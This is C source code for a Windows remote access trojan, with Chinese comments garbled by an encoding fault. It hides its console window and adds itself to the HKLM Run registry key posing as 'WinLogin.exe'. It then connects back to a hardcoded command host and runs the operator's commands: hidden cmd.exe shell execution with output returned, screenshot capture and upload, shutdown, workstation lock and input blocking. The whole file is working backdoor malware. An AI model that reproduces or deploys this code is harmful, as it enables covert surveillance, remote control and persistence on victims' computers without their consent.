#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <winable.h>
#pragma comment(lib, "ws2_32.lib")
#ifdef _MSC_VER  
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )  
#endif

#define MSG_LEN 1024

char ServerAddr[] = "oo.xx.com"; //�������ӵ�����
int ServerPort = 8080;  //���ӵĶ˿�
int CaptureImage(HWND hWnd, CHAR *dirPath, CHAR *filename);


// �����ļ�
int sendImage(SOCKET client) 
{		
    char sendbuf[1024];
    DWORD        dwRead;  
    BOOL         bRet;  
    char filename[]="screen.png";
	Sleep(100);

    HANDLE hFile=CreateFile(filename,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);  
    while(1) {  //�����ļ���buf
        bRet=ReadFile(hFile,sendbuf,1024,&dwRead,NULL);
        if(bRet==FALSE) break;
        else if(dwRead==0) {
			Sleep(100);
            break;  
        } else {  
            send(client,sendbuf,dwRead,0);
        }  
    }
	send(client,"EOF",strlen("EOF")+1,0);
    CloseHandle(hFile);
	system("del screen.png");
	
	return 0;
}

// ִ��CMD����ܵ�����
int cmd(char *cmdStr, char *message)
{
    DWORD readByte = 0;
    char command[1024] = {0};
    char buf[MSG_LEN] = {0}; //������
 
    HANDLE hRead, hWrite;
    STARTUPINFO si;         // ����������Ϣ
    PROCESS_INFORMATION pi; // ������Ϣ
    SECURITY_ATTRIBUTES sa; // �ܵ���ȫ����
 
    // ���ùܵ���ȫ����
    sa.nLength = sizeof( sa );
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
 
    // ���������ܵ����ܵ�����ǿɱ��̳е�
    if( !CreatePipe(&hRead, &hWrite, &sa, 1024)) {
        return 1;
    }
 
    // ���� cmd ������Ϣ
    ZeroMemory( &si, sizeof( si ) );
    si.cb = sizeof( si ); // ��ȡ���ݴ�С
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // ��׼�����ʹ�ö����
    si.wShowWindow = SW_HIDE;               // ���ش�������
    si.hStdOutput = si.hStdError = hWrite;  // ������ʹ�����ָ��ܵ�д��һͷ

	// ƴ�� cmd ����
	sprintf(command, "cmd.exe /c %s", cmdStr);
 
    // �����ӽ���,��������,�ӽ����ǿɼ̳е�
    if ( !CreateProcess( NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi )) {
        //printf( "Create Process Error: %x\n", (unsigned int)GetLastError());
        CloseHandle( hRead );
        CloseHandle( hWrite );
        return 1;
    }
    CloseHandle( hWrite );
  
    //��ȡ�ܵ���read��,���cmd���
    while (ReadFile( hRead, buf, MSG_LEN, &readByte, NULL )) {
        strcat(message, buf);
        ZeroMemory( buf, MSG_LEN );
    }
    CloseHandle( hRead );

    return 0;
}



// ��Ļ����
int CaptureImage(HWND hwnd, CHAR *dirPath, CHAR *filename)
{
    HANDLE hDIB;
    HANDLE hFile;
    DWORD dwBmpSize;
    DWORD dwSizeofDIB;
    DWORD dwBytesWritten;
    CHAR FilePath[MAX_PATH];
    HBITMAP hbmScreen = NULL;
    BITMAP bmpScreen;
    BITMAPFILEHEADER bmfHeader;
    BITMAPINFOHEADER bi;
    CHAR *lpbitmap;
    INT width = GetSystemMetrics(SM_CXSCREEN);  // ��Ļ��
    INT height = GetSystemMetrics(SM_CYSCREEN);  // ��Ļ��
    HDC hdcScreen = GetDC(NULL); // ȫ��ĻDC
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen); // ���������ڴ�DC
 
    if (!hdcMemDC) goto done;
 
    // ͨ������DC ����һ������λͼ
    hbmScreen = CreateCompatibleBitmap(hdcScreen, width, height);
 
    if (!hbmScreen) goto done;
 
    // ��λͼ�鴫�͵������ڴ�DC��
    SelectObject(hdcMemDC, hbmScreen);
    if (!BitBlt(
                hdcMemDC,    // Ŀ��DC
                0, 0,        // Ŀ��DC�� x,y ����
                width, height, // Ŀ�� DC �Ŀ��
                hdcScreen,   // ��ԴDC
                0, 0,        // ��ԴDC�� x,y ����
                SRCCOPY))    // ճ����ʽ
        goto done;
  
    // ��ȡλͼ��Ϣ������� bmpScreen ��
    GetObject(hbmScreen, sizeof(BITMAP), &bmpScreen);
 
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmpScreen.bmWidth;
    bi.biHeight = bmpScreen.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
 
    dwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmpScreen.bmHeight;

    // handle ָ�����Ĭ�ϵĶ�
    hDIB = GlobalAlloc(GHND, dwBmpSize);
    lpbitmap = (char *)GlobalLock(hDIB);
 
    // ��ȡ����λͼ��λ���ҿ��������һ�� lpbitmap ��.
    GetDIBits(
        hdcScreen,  // �豸�������
        hbmScreen,  // λͼ���
        0,          // ָ�������ĵ�һ��ɨ����
        (UINT)bmpScreen.bmHeight, // ָ��������ɨ������
        lpbitmap,   // ָ����������λͼ���ݵĻ�������ָ��
        (BITMAPINFO *)&bi, // �ýṹ�屣��λͼ�����ݸ�ʽ
        DIB_RGB_COLORS // ��ɫ���ɺ졢�̡�����RGB������ֱ��ֵ����
    );
 
 
    wsprintf(FilePath, "%s\\%s.png", dirPath, filename);
 
    // ����һ���ļ��������ļ���ͼ
    hFile = CreateFile(
                FilePath,
                GENERIC_WRITE,
                0,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );
 
    // �� ͼƬͷ(headers)�Ĵ�С, ����λͼ�Ĵ�С����������ļ��Ĵ�С
    dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
 
    // ���� Offset ƫ����λͼ��λ(bitmap bits)ʵ�ʿ�ʼ�ĵط�
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
 
    // �ļ���С
    bmfHeader.bfSize = dwSizeofDIB;
 
    // λͼ�� bfType �������ַ��� "BM"
    bmfHeader.bfType = 0x4D42; //BM
 
    dwBytesWritten = 0;
    WriteFile(hFile, (LPSTR)&bmfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)&bi, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
    WriteFile(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
 
    // �������ڴ沢�ͷ�
    GlobalUnlock(hDIB);
    GlobalFree(hDIB);
 
    // �ر��ļ����
    CloseHandle(hFile);
 
    // ������Դ
done:
    DeleteObject(hbmScreen);
    DeleteObject(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);
 
    return 0;
}

void c_socket() 
{

	// ��ʼ�� Winsock
	WSADATA wsaData;
	struct hostent *host;
	struct in_addr addr;

	int iResult = WSAStartup( MAKEWORD(2,2), &wsaData );
	if ( iResult != NO_ERROR )
			//printf("Error at WSAStartup()\n");

	while(1){

		//����������ַ
		host = gethostbyname(ServerAddr);
		if( host == NULL ) {
			Sleep(20000);
			continue;
		}else{
			addr.s_addr = *(unsigned long * )host->h_addr;
			break;
		}
	}

	// ����socket socket.
	SOCKET client;
	client = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if ( client == INVALID_SOCKET ) {
		printf( "Error at socket(): %ld\n", WSAGetLastError() );
		WSACleanup();
		return;
	}

	// ���ӵ�������.
	sockaddr_in clientService;
	clientService.sin_family = AF_INET;
	clientService.sin_addr.s_addr = inet_addr("192.168.10.233");
	//clientService.sin_addr.s_addr = inet_addr(inet_ntoa(addr));
	clientService.sin_port = htons(ServerPort);
	while(1){
		if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
			printf( "\nFailed to connect.\nWait 10s...\n" );
			Sleep(2000);
			continue;
		}else { 
			break;
		}
	}

	//�����ȴ������ָ��
	char recvCmd[MSG_LEN] = {0};
	char message[MSG_LEN] = {0};
	while(1) {
		ZeroMemory(recvCmd, sizeof(recvCmd));
		ZeroMemory(message,sizeof(message));

		//�ӷ���˻�ȡ����
        recv(client, recvCmd, MSG_LEN, 0);
		if(strlen(recvCmd)<1){  //SOCKET�ж�����
			closesocket(client);
			while(1){
				client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				if ( connect( client, (SOCKADDR*) &clientService, sizeof(clientService) ) == SOCKET_ERROR) {
					printf( "\nFailed to connect.\nWait 10s...\n" );
					Sleep(2000);
					continue;
				}else break;
			}
			continue;
		}else if(strcmp(recvCmd,"shutdown")==0){  //�ػ�
			system("shutdown -s -t 1");
			continue;
		}else if(strcmp(recvCmd,"reboot")==0){  //����
			system("shutdown -r -t 10");
			continue;
		}else if(strcmp(recvCmd,"cancel")==0){  //ȡ���ػ�
			system("shutdown -a");
			continue;
		}else if(strcmp(recvCmd,"kill-client")==0){  //�رտͻ���
			send(client,"Client has exit!", 18, 0);
			exit(0);
		}else if(strcmp(recvCmd,"screenshot")==0){  //����
			CaptureImage(GetDesktopWindow(), "./", "screen"); //����screen.png
			sendImage(client);
			continue;
		}else if((recvCmd[0]=='$') || (recvCmd[0]=='@')){
			int i;
			char c;
			char CMD[30]={0};
			for(i = 1;(c = recvCmd[i])!= '\0';i ++) {
				CMD[i-1] = recvCmd[i];
			}
			if(recvCmd[0] == '$') {  //ִ������ָ��
				if(! cmd(CMD,message)) send(client, message, strlen(message)+1, 0);
				else send(client,"CMD Error!\n",13,0);
			}else {  //����
				MessageBox(NULL,CMD,"Windows Message",MB_OK|MB_ICONWARNING);
			}
			continue;
		}else if(strcmp(recvCmd,"lock")==0){ //����
			system("%windir%\\system32\\rundll32.exe user32.dll,LockWorkStation");
			continue;
		}else if(strcmp(recvCmd,"blockinput")==0){ //�������ͼ���
			BlockInput(true);
			Sleep(5000);
			BlockInput(false);
			continue;
		}else if(strcmp(recvCmd,"mouse")==0){ //���ù��
			SetCursorPos(0,0);
			continue;
		}else{
			continue;
		}
	}
	WSACleanup();
    return;
}


int autoRun()
{
    HKEY hKey;
    DWORD result;
    char path[] = "C:\\Users\\WinLogin.exe"; // Ҫ���������ĳ���
 
    //��ע���
    result = RegOpenKeyEx(
        HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", // Ҫ�򿪵�ע���������
        0,              // �������������� 0
        KEY_SET_VALUE,  // ��Ȩ�ޣ�д��
        &hKey           // ��֮��ľ��
    );

    if (result != ERROR_SUCCESS) return 0;

    // ��ע���������(û���������һ��ֵ)
    result = RegSetValueEx(
                 hKey,
                 "Registry Example", // ����
                 0,                  // �������������� 0
                 REG_SZ,             // ��ֵ����Ϊ�ַ���
                 (const unsigned char *)path, // �ַ����׵�ַ
                 sizeof(path)        // �ַ�������
             );

    if (result != ERROR_SUCCESS) return 0;
 
    //�ر�ע���:
    RegCloseKey(hKey);
    return 0;
}

int main()
{
	autoRun();
	c_socket();

	return 0;
}
